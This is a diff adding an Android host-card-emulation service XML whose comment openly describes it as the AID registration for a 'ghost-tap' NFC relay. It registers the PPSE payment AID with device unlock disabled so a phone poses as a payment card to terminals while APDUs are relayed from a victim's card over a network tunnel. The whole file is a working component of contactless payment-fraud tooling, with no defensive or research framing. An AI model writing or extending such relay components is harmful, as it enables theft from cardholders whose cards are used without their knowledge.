@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- NFC AID registration for ghost-tap relay.
+     PPSE (Proximity Payment System Environment) AID:
+     Used by contactless payment terminals to discover payment apps.
+     Registering this AID makes the device respond to POS terminals
+     as if it were a payment card — the relay forwards APDUs to the
+     actual victim's card via network tunnel. -->
+<host-apdu-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:description="@string/app_name"
+    android:requireDeviceUnlock="false">
+
+    <aid-group
+        android:category="payment"
+        android:description="@string/app_name">
+        <!-- PPSE AID: 2PAY.SYS.DDF01 -->
+        <aid-filter android:name="325041592E5359532E4444463031" />
+    </aid-group>
+</host-apdu-service>
